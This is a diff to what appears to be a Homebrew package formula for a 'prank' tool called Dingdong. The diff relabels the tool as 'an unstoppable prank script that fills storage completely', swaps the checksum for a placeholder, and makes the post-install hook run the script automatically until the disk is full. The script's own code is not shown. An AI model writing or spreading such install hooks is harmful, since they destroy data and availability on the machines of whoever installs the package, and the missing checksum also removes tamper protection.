@@ -1,10 +1,9 @@
 class Dingdong < Formula
-  desc "A harmless prank script that talks and replicates a file"
+  desc "An unstoppable prank script that fills storage completely"
   homepage "https://github.com/punkkkkkkk/dingdong"
   url "https://github.com/punkkkkkkk/dingdong/archive/refs/heads/main.zip"
-  version "1.0.0"
-  sha256 "070507c3f648cb396a8dbf30fb77f64085f0b119de3993b1c1e3c97728f7db64" 
-
+  version "2.1.0"
+  sha256 "REPLACE_WITH_NEW_HASH_AFTER_UPDATING"
 
   def install
     bin.install "prank.sh"
@@ -12,6 +11,7 @@ class Dingdong < Formula
   end
 
   def post_install
-    system "#{bin}/prank.sh #{pkgshare}/payload.png &"
+    ohai "⚠️  WARNING: This will run until disk is full and cannot be stopped easily!"
+    system "#{bin}/prank.sh #{pkgshare}/payload.png"
   end
 end
